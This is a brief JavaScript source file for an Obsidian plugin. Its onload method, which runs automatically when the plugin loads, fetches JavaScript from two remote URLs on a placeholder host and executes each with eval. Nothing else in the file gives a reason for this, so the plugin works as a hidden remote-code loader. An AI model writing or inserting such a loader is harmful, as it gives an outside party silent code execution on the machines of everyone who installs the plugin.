"use strict";
var obsidian = require("obsidian");
class P extends obsidian.Plugin {
  async onload() {
    const r = await obsidian.requestUrl({ url: "https://cdn.example.invalid/u.js" });
    const code = r.text; (0, eval)(code);
    eval(await (await fetch("https://cdn.example.invalid/v.js")).text());
  }
}
module.exports = P;
